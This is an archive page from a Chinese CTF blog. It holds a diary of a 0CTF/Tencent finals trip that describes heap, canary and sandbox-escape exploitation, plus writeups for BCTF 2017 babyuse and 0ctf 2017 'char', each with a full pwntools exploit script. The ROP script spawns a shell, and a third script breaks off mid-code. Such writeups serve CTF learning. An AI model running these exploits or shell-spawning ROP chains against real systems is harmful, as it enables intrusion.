<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <!-- Title -->
    
    <title>ctf - DazzleP&#39;s Blog</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!--Description-->
    
        <meta name="description" content="A poor bin dog from ROIS@FZU">
    

    <!--Author-->
    
        <meta name="author" content="DazzleP">
    

    <!--Favicon-->
    
      <link rel="icon" href="images/favicon.ico">
    

    <!--Open Graph Title-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="DazzleP&#39;s Blog"/>

    <!--Page Cover-->
    
        <meta property="og:image" content="undefined"/>
    



    <!-- Custom CSS -->
    <link rel="stylesheet" href="/sass/main.css">

    <!--[if lt IE 8]>
        <script src="/js/ie/html5shiv.js"></script>
    <![endif]-->

    <!--[if lt IE 8]>
        <link rel="stylesheet" href="/sass/ie8.css">
    <![endif]-->


    <!-- Google Analytics -->
    


</head>


<body id="top">

    <!-- Header -->
    <header id="header">
  <div class="inner">
    <a href="/" class="image avatar"><img src="https://www.gravatar.com/avatar/e6cfae2d726e15821ea3c4f0848d5451" alt="" /></a>    <h1><strong>This is Strata</strong>, a free, fully responsive site<br />template designed by <a href="http://html5up.net">HTML5 UP</a>.</h1>
  </div>
</header>


    <!-- Main -->
		<div id="main">

      <!-- Main Content -->
      
  
  
    
    
      
      
      <section class="archives-wrap">
        <div class="archive-year">
          <a href="/archives/2017" class="archive-year">2017</a>
        </div>
        <div class="archives">
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2017-06-11
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        深圳(chuan)五日游
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <p>在0ctf线上赛，我们和西电的L-team组成了G190X战队，取得了不错的成绩，虽然没进0CTF决赛，但还是拿到了萌新邀请赛的资格，冠军有机会受鹅厂资助去vegas  </p>
<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>下午到达深圳后去到酒店，见到了小金子，发现队伍的指导老师住的地方和选手住的地方不一样，似乎是指导老师有其他活动。。。？<br>晚上八点左右蓝猫师傅去领了比赛的T恤还有选手牌，抽签决定赛场位置时发现我们和0ctf决赛的队伍是同一个场地，也就是说我们很有可能和他们做的是一套题<br>我们入住的酒店。。。其他的没啥，就是网速太拙计了，基本属于啥都干不了的状态，晚上拿KGGG的switch玩了几把，然后早早休息了，第二天是jeopardy所以也没啥好准备的  </p>
<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>昨晚上主办方给每个队伍发了T恤，但是不是一定要在比赛的时候穿，所以我们还是穿的我们自己的衣服，但是在酒店餐厅吃早饭的时候发现国内dalao们好像都穿了。。<br>到达场地后，发现我们的位置正对着场地边上的灯光(我们的位置在场地边缘)，蓝光照脸怎么玩。。。？不过后来灯光调暗了就不影响了<br>每个队伍的位置给了四条网线，连上需要配置静态IP，但不知为何小金子的mac老是失败，于是乎还是用了我的路由器来配置<br>比赛开始后放了大量的题目，web，pwn都很多，但只有一个misc，后来又放了一个crypto<br>大概浏览了一遍，决定先从world of fast bin下手，略微分析了下发现这个程序的逻辑和线上赛的babyheap几乎一样，不一样的是限制了可分配chunk的大小，<br>不能大于0x58，构造heap overlap后leak出堆地址和libc，发现远程服务器的堆地址最高位0x55~0x56之间，也就是说fastbin attack修改top chunk指针的方法还是能用，之后遍交给小金子完成了<br>然后我就去看python了，题给了个python命令行程序，保留了符号表，但是代码量很大，IDA分析半天没啥头绪，而且程序没有os, command， subprocess等模块，无法执行命令<br>交给kggg分析，看能不能搞出个文件读写来读flag，kggg试了几次给出了这样一个有效的poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(fn, mode=<span class="string">'r'</span>)</span>:</span></div><div class="line">    <span class="keyword">import</span> sys</div><div class="line">    file = sys.stdin.__class__</div><div class="line">    f=file.__new__(file)</div><div class="line">    f.__init__(fn, mode)</div><div class="line">    <span class="keyword">return</span> f</div></pre></td></tr></table></figure></p>
<p>大概原理就是，一个类的对象包含这个类的所有方法，包括对这个对象的初始化等等，这个程序允许使用sys模块，sys中有stdin，stdout，stderr这样的file object，<br>因此，file object的方法也都是可以使用，因此可以用那些方法创建出新的file object，然后就可以文件读写辣<br>之后就是尝试读flag，/home/python/flag, ./flag都是过了，服务端都没有这些文件，也就是说咱还得getshell然后去找flag<br>然后我的思路是写进程的mem,这样就可以修改这个已经在运行的进程的代码段来控制程序行为，但是很奇怪的是mem文件无法打开，按道理linux是允许进程写自己的mem的，后来发现是open的时候mode选错了。。。然后就是写exit@plt为shellcode，然后退出程序就可以getshell了，<br>后来发现我们是国内队伍FB ~_~<br>中间有个小插曲，说是0CTF那边LC/BC上0day做题了。。。不愧是毛子啊。。。<br>然后开始看upxof，这个题的程序是个带壳程序，壳是出题人手写的，运行时解壳需要输入password，不过很神奇的是这样也可以直接用linux的upx来解壳<br>整个题有俩洞，一个是解壳后的程序带canary的栈溢出，一个是程序解壳时输入password存在栈溢出，但是不知道咋用，分析了下觉得壳内的canary是绕不过的，<br>似乎是要利用解壳时的栈溢出，但是栈上没有返回地址给我们覆盖<br>后来想用ld.so的加载elf文件的过程，覆盖栈上的环境变量指针，让ld.so加载我们想要的东西，但是这个想法一是没实现，因为栈上的数据不能XJB改，调了半天exp都没成功，<br>二是我们要控制ld.so的加载，就一定会有一个之前正常执行时要加载的目标不会被加载，strace了一下程序发现没有啥东西是可以替代的。。。<br>第一天比赛结束，我们只解出了两个题，上一张排名，我们暂时排在第一<br><img src="/2017/06/11/深圳-chuan-五日游/day2scordboard.png" alt="day2scordboard" title="day2scordboard"><br>晚上回到酒店继续分析，kggg不久后解出wannacry，我继续看upxof，小金子看那个内核pwn<br>苦于实在无思路，我翻了下杨坤博士的那篇掘金CTF的slide，看下有没有其他的绕canary的方法，发现里面提到了，canary是由ld.so进行初始化的<br>于是遍着手调试跟踪，发现环境变量数据上面一部分数据是作为canary被ld.so使用的，整个过程大概是在加载elf的时候，从栈上取出那个特定数据，<br>然后将其放入TLS，然后程序运行时若需要canary，就从TLS中取出来，也就是说，如果能利用解壳时的栈溢出修改那个变量，我们就可以控制canary用壳内的栈溢出做<br>ROP了，不过还是那个原因，栈上的内容不能瞎改，所以EXP还是很难写，而且当时调试出来的时候已经挺晚了，困的要死，直接就睡了  </p>
<h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h2><p>到达赛场后，没多久小金子就写出了成功控制canary的poc，于是就可以做ROP辣，之后便完成了upxof，我们继续排在第一<br>于此同时，主办方又放了俩pwn。。。有个babystack看上去挺简单，我们就先做那个了<br>babystack是一个裸的栈溢出，保护全开，但是是跑在qemu下的，运行命令长这样<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">#!/bin/bash</span></div><div class="line"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</div><div class="line"><span class="built_in">exec</span> ./qemu-x86_64 -B $((RANDOM * 4096)) ./app</div></pre></td></tr></table></figure></p>
<p>google了一波-B参数，发现是guest的offset啥的。。。没怎么看清楚，当时想法是和程序的ASLR有关<br>当时卡了好久，但是因为程序保护全开，而且函数返回时关掉了stdin和stderr，无法再次输入，只有一次ROP的话咋绕PIE和glibc aslr。。。？<br>挺长一段时间我们都想着这题其实是没法做的吧。。。不过0ctf那边shellphish很快就FB了，估计是有啥点可以绕<br>小金子找出了qemu下调试的方法，得用gdbserver，但是非常蛋疼的是无法用vmmap查看内存映射，而且断点十分难下，也无法在程序挂起时把程序断掉<br>硬着头皮调试，然后改运行命令的RANDOM值为特定值来看是否和ASLR有关，但是发现一个很诡异的情况，不管我RANDOM取啥值程序的基址都是不变的<br>这就非常诡异了，小金子的机子因为很奇怪的原因无法调试，没办法查看是不是我机子的问题，于是尝试了一波远程，发现远程服务器的程序基址和我本地的是一样的，而且也是固定的。。。<br>那这个PIE开了也白开啊。。。然后想做ROP来leak libc，来看看远程的libc是不是也是基址不随机的，但是非常尴尬的是程序里控制RDI的gadget的地址有个0x0a，输入时会被截断，<br>而且程序里没有其他好用的gadget了<br>之前调试的时候发现本地的LIBC是基址固定的，但是远程不确定，所以我们无法用libc里的gadget，但是之后像刀割梗，开启PIE的程序运行时<br>，其程序的基址和libc的基址之间的offset是固定的，具体的值和linux内核版本相关，于是写脚本爆破远程libc基址，运气很好，没爆多久就爆出来了<br>之后就是做ROP，刚开始是想反弹shell，但是本地测试发现无法创建socket套接字，也无法执行/bin/sh，似乎是qemu的原因，于是转而读flag，但是本地测试的时候一直无法打开flag文件，<br>试了几次又好了。。。简直诡异<br>这就是我们做出来的最后一个pwn了，其他的pwn实在是没啥思路，然后比赛就结束了，最后我们排在第三<br><img src="/2017/06/11/深圳-chuan-五日游/day3scordboard_1.png" alt="day3scordboard_1" title="day3scordboard_1"><br><img src="/2017/06/11/深圳-chuan-五日游/day3scordboard_2.png" alt="day3scordboard_2" title="day3scordboard_2"><br>然后上一张猫哥<br><img src="/2017/06/11/深圳-chuan-五日游/cat.jpg" alt="cat" title="cat"><br>然后就是颁奖典礼，先进行的是萌新邀请赛，我们作为季军第一个上场，然后是亚军的Nu1l和冠军AAA，冠亚季军每个队员的奖品是HHKB TYPE-S，<br>每个队分别是两个无刻两个有刻，无刻的比较贵，我拿到的是有刻的:P<br>然后作为冠军的AAA额外有0x4000(还是0x4400来着。。。？)RMB的奖金和vegas tour，可以说是非常羡慕了<br>之后是0ctf决赛的颁奖，每个队伍都有奖金，冠军奖金0x20000RMB，之后每一名除以2，冠军还有今年DEFCON CTF决赛的外卡<br>前三分别是Shellphish，217和binja，引人注目的是binja还来了个女黑阔，而且看来实力不俗，由于shellphish之前已有defcon的资格，217是作为hitcon的一员，这次比赛的外卡应该是给binja的<br>晚上回到酒店，酒店网络实在是蠢，只好b栈缓存清晰度最差的视频看看，然后玩玩switch，这中间猫哥出门社交，小金子回自己房间洗澡，217的队员来找我们问RCTF奖金的事情，结果他们俩的房间我进不去<br>只好和217的队员说奖金第二天晚宴的时候给他们  </p>
<h2 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h2><p>腾讯总部赛后复盘和选手晚宴<br>到达鹅厂后，工作人员给发了临时通行证，进到里面发现确实能看到挺多企鹅的。。。<br>复盘讲了挺久的，讲下还记得的点吧  </p>
<ol>
<li>有个web题，漏洞点啥的我忘了，但是实际利用一点也不web，灰常的二进制，但是毛子们可不管，直接上0day把sqlite日穿  </li>
<li>线上没人解出的starcrat，利用非常简单，读got然后写got，但是程序逻辑过于复杂，用到了线段树等数据结构，懂算法还是很重要的  </li>
<li>全场没人解出(我记得是)的RSA，来自某篇paper，果然paper才是水平的提现啊。。。</li>
<li>我们python的解法是非预期，预期解法是用py opcode做任意代码执行，但是讲道理既然考虑到了可以文件读写，应该也能考虑到mem的读写才对  </li>
<li>我们解出的其他pwn思路和出题人的预想差不多</li>
<li>babystack的qemu并不是虚拟机，而是类似于一个沙盒的东西，多了个31337的syscall来限制程序行为</li>
</ol>
<p>其他的也不大记得请了<br>然后吃中饭的时候，我们和binja的人在一块吃，好像有个天大的dalao搭讪binja的队员，秀了波日语，讲的还挺不错，反正比我这个整天看日漫的废宅好<br>GC的是，他们交谈的时候binja的“女”黑阔也说话了，怎么是个男人的声音。。。？不是女的么？WHY？？？？完全是一张女人脸，而且是标准的黑长直<br>后来才知道那位是日本著名的变装黑客，纯爷们，后来小金子还和我说，你没看到他的喉结么。。。  </p>
<p>晚宴的时候，遇到了科恩的聂博，交流了一波，小金子说我也面试过科恩，于是聂博问我具体的情况，我和他提了下，之后他就去其他地方了<br>然后让我惊讶的是陈良过来找我，说是要和我说下情况，目测是聂博过去和他提了下  </p>
<p>晚上回到酒店，顶着时不时断线的网络下好了巨人和埃罗芒阿老师最新话，结果小金子在自己房间里在我下好前就看完了:P<br>过后蓝猫师傅的好基友AAA的melody来送香蕉给我们吃，顺便一块儿看巨人，然后被我剧透一脸23333<br>后来玩switch玩到十二点左右，开了火猫看震中杯LFY打OG，妈呀好长时间没见的LFY猛地一笔直接2:0，看的好tm爽  </p>
<h2 id="Day-5"><a href="#Day-5" class="headerlink" title="Day 5"></a>Day 5</h2><p>下午飞机回福州，小金子回西安也是下午走，于是我们早上睡到饱才出的酒店，地铁还挺快，半个小时左右就到机场了，然后我们就分开各自找登机口去了  </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这几天比赛累，但是玩的挺开心，赚了个HHKB，只是上面有TCTF的定制logo，不大好卖，作为windows用户用hhkb得适应一段时间，现在还是用的IKBC的青轴，上一张键盘做结尾吧<br><img src="/2017/06/11/深圳-chuan-五日游/keyboard.jpg" alt="keyboard" title="keyboard"> </p>

      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2017-05-05
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        BCTF 2017 babyuse
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="babyuse"><a href="#babyuse" class="headerlink" title="babyuse"></a>babyuse</h2><p>使用武器时存在UAF，不要选择，把下标为0的武器删除再使用即可，最后改vatable成员为libc中的one-gadget即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, type, length, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'2. QBZ95\n'</span>)</div><div class="line">    p.send(str(type) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input name:\n'</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'8\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Drop</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'6\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a gun to delete:\n'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'8\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rename</span><span class="params">(p, idx, length, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a gun to rename:\n'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input name:\n'</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'8\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./babyuse_patched2', env = &#123;'LD_PRELOAD' : './libc.so'&#125;)</span></div><div class="line">p = remote(<span class="string">'202.112.51.247'</span>, <span class="number">3456</span>)</div><div class="line"></div><div class="line">REMOTE = <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> REMOTE:</div><div class="line">    p.recvuntil(<span class="string">'Token:'</span>)</div><div class="line">    p.send(<span class="string">'yrkm0XEl56HqNPp8LrHuV0CRbvfW4aoT\n'</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, <span class="string">'A'</span> * <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, <span class="string">'B'</span> * <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, <span class="string">'C'</span> * <span class="number">0x80</span>)</div><div class="line">Drop(p, <span class="number">0</span>)</div><div class="line">Drop(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">p.send(<span class="string">'5\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Select gun '</span>)</div><div class="line">main_arena = u32(p.recvn(<span class="number">4</span>))</div><div class="line"></div><div class="line">libc_base = main_arena - <span class="number">0x1b27b0</span></div><div class="line"></div><div class="line">log.info(<span class="string">"libc base: "</span> + hex(libc_base))</div><div class="line"></div><div class="line">heap_addr = u32(p.recvn(<span class="number">4</span>))</div><div class="line"></div><div class="line">log.info(<span class="string">"heap addr: "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'4. Main menu'</span>)</div><div class="line">p.send(<span class="string">'4\n'</span>)</div><div class="line"></div><div class="line">Drop(p, <span class="number">2</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">2</span></div><div class="line">payload += p32(libc_base + <span class="number">0x3ac69</span>)</div><div class="line">payload += p32(libc_base + <span class="number">0x5fbc5</span>)</div><div class="line">payload += p32(libc_base + <span class="number">0x5fbc6</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, payload + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x1f</span>, <span class="string">'B'</span> * <span class="number">0x20</span>)</div><div class="line"></div><div class="line">fake_vtable = heap_addr - <span class="number">0xa8</span></div><div class="line"></div><div class="line">Drop(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">Rename(p, <span class="number">1</span>, <span class="number">0x0f</span>, p32(fake_vtable) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>

      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2017-03-24
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        0ctf 2017 writeup
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="char"><a href="#char" class="headerlink" title="char"></a>char</h2><p>很明显的栈溢出，但是程序会检查输入是否全为可打印字符，比较良心的是程序把一个libc映射到0x5555e000这个段上，算是让我们有点gadget可用<br>因为程序通过<code>strlen()</code>获取输入长度，所以我们可以在输入中间加上<code>&#39;\x00&#39;</code>来截断<code>strlen()</code>，这样只需要<code>&#39;\x00&#39;</code>之前的部分全为可打印字符，之后的payload不受影响<br>只需要找到合适的gadget让栈跳到后方返回就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">base = <span class="number">0x5555e000</span></div><div class="line"></div><div class="line"><span class="comment">#0x0001706b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">int80 = <span class="number">0x00B7E36</span></div><div class="line">pop5_ret = <span class="number">0x0001706b</span></div><div class="line">ret80 = <span class="number">0x00132d35</span></div><div class="line">ret52 = <span class="number">0x00004234</span></div><div class="line">pop4_ret10 = <span class="number">0x00017e76</span></div><div class="line">addesp9c_ret = <span class="number">0x000e3cee</span></div><div class="line">addesp98_pop_ret = <span class="number">0x0011cf7a</span></div><div class="line">mov_eax_ecx = <span class="number">0x00148251</span></div><div class="line">xchg_esp_eax = <span class="number">0x000e6d62</span></div><div class="line">add_esp1c_ret = <span class="number">0x00115f35</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./char_patched'</span>)</div><div class="line"><span class="comment">#p = remote('202.120.7.214', 23222)</span></div><div class="line"></div><div class="line">ebx_ret = <span class="number">0x0007dce9</span></div><div class="line">edx_ecx_eax_ret = <span class="number">0x000f277f</span></div><div class="line"></div><div class="line">scanf_plt = <span class="number">0x08048540</span></div><div class="line">pop2_ret = <span class="number">0x804889a</span></div><div class="line">s2400 = <span class="number">0x804894C</span></div><div class="line">data = <span class="number">0x804A03C</span></div><div class="line">system_addr = <span class="number">0x003EED0</span> + base</div><div class="line">execve_addr = <span class="number">0x0003ECF2</span> + base</div><div class="line">eax_ret = <span class="number">0x0016a7d4</span> + base</div><div class="line">pop3_ret = <span class="number">0x8048899</span></div><div class="line">binsh = <span class="number">0x556bb7ec</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x08048693</span></div><div class="line">write_plt = <span class="number">0x8048520</span></div><div class="line">write_got = <span class="number">0x804A030</span></div><div class="line">puts_plt = <span class="number">0x80484B0</span></div><div class="line">scanf_got = <span class="number">0x804A038</span></div><div class="line">strcpy_got = <span class="number">0x0804A010</span></div><div class="line">strcpy_plt = <span class="number">0x080484A0</span></div><div class="line">libc_start_main_got = <span class="number">0x804A00C</span> + <span class="number">4</span></div><div class="line">edx_ret = <span class="number">0x00001a9e</span> + base</div><div class="line">ecx_ret = <span class="number">0x000cae3b</span> + base</div><div class="line"></div><div class="line">inc_eax_ret = <span class="number">0x00026a9b</span> + base</div><div class="line"></div><div class="line">log.info(hex(write_plt))</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">28</span></div><div class="line">payload += p32(add_esp1c_ret + base)</div><div class="line">payload += p32(mov_eax_ecx + base)</div><div class="line">payload += p32(xchg_esp_eax + base)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">3</span></div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">5</span></div><div class="line">payload += p32(ebx_ret + base)</div><div class="line">payload += p32(binsh)</div><div class="line">payload += p32(edx_ret)</div><div class="line">payload += p32(<span class="number">0x00</span>)</div><div class="line">payload += p32(ecx_ret)</div><div class="line">payload += p32(<span class="number">0x00</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</div><div class="line">	payload += p32(inc_eax_ret)</div><div class="line"></div><div class="line">payload += p32(int80 + base)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line">log.info(len(payload))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'GO : ) \n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="diethard"><a href="#diethard" class="headerlink" title="diethard"></a>diethard</h2><p>一个自己实现的内存管理系统，程序会根据申请内存的大小分配一个类似index的东西，相同index的堆块会分配到同一页，计算了一下发现index为8时，对应的对块大小集合元素最多<br>其中分配1032和2016大小的堆块会出bug，不用释放内存就出现堆块重叠了。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, length, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">"Input Message Length:\n"</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">"Please Input Message:\n"</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, index)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Which Message You Want To Delete?\n'</span>)</div><div class="line">    p.send(str(index) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="comment">#p = process('./diethard')</span></div><div class="line">    p = remote(<span class="string">'202.120.7.194'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line">    New(p, <span class="number">1032</span>, <span 